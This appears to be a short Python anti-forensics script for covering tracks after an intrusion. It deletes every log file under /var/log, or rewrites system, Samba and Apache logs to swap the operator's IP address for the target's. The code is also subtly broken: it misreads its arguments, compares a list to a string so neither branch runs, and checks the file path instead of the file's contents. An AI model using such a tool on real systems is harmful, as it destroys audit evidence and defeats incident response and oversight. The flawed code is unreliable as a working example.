# You need root privilege for this to work.
import subprocess
import sys
import os

TARGET_IP_ADDRESS = sys.argv[0]
MY_IP_ADDRESS = sys.argv[1]

LOG_FILES = [
    # System
    '/var/log/messages',
    '/var/log/daemon.log',
    '/var/log/auth.log',
    '/var/log/debug',
    '/var/log/kernel.log',
    '/var/log/syslog',
    # Application
    '/var/log/samba/log.nmbd',
    '/var/log/samba/log.smbd',
    f'/var/log/samba/log.{MY_IP_ADDRESS}',
    '/var/log/apache2/access.log',
    '/var/log/apache2/error.log'
]

# Delete all logs
if sys.argv == '-d':
    for root, dirs, files in os.walk('/var/log/'):
        for file in files:
            if 'log' in file:  # Remove log files and backups
                os.remove(os.path.join(root, file))

# Replaces logs with local IP address
if sys.argv == '-r':
    for log_file in LOG_FILES:
        with open(log_file, 'r') as file:
            file_data = file.read()
        if MY_IP_ADDRESS in log_file:
            tempered_data = file_data.replace(MY_IP_ADDRESS, TARGET_IP_ADDRESS)
        with open(log_file, 'w') as file:
            file.write(tempered_data)
